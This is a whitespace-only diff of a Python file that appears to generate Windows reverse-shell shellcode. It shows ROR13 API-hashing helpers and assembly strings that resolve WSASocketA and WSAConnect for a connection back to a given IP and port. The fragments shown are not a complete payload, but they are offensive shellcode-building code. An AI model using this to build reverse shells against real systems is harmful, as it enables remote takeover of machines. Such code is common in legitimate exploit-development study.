@@ -26,22 +26,22 @@ def to_sin_port(port):
 
 
 def ror_str(byte, count):
-	binb = numpy.base_repr(byte, 2).zfill(32)
-	while count > 0:
-		binb = binb[-1] + binb[0:-1]
-		count -= 1
-	return (int(binb, 2))
+    binb = numpy.base_repr(byte, 2).zfill(32)
+    while count > 0:
+        binb = binb[-1] + binb[0:-1]
+        count -= 1
+    return (int(binb, 2))
 
 
 def push_function_hash(function_name):
-	edx = 0x00
-	ror_count = 0
-	for eax in function_name:
-		edx = edx + ord(eax)
-		if ror_count < len(function_name)-1:
-			edx = ror_str(edx, 0xd)
-		ror_count += 1
-	return ("push " + hex(edx))
+    edx = 0x00
+    ror_count = 0
+    for eax in function_name:
+        edx = edx + ord(eax)
+        if ror_count < len(function_name)-1:
+            edx = ror_str(edx, 0xd)
+        ror_count += 1
+    return ("push " + hex(edx))
 
 
 def push_string(input_string):
@@ -177,7 +177,7 @@ def rev_shellcode(rev_ip_addr, rev_port, breakpoint=0):
         push_instr_wsasocketa_hash,                  # WSASocketA hash
         "       call dword ptr [ebp+0x04]       ;",  # Call find_function
         "       mov [ebp+0x20], eax             ;",  # Save WSASocketA address for later usage
-        push_instr_wsaconnect_hash, 		     # WSAConnect hash
+        push_instr_wsaconnect_hash,                  # WSAConnect hash
         "       call dword ptr [ebp+0x04]       ;",  # Call find_function
         "       mov [ebp+0x24], eax             ;",  # Save WSAConnect address for later usage
         "   call_wsastartup:                    ;",
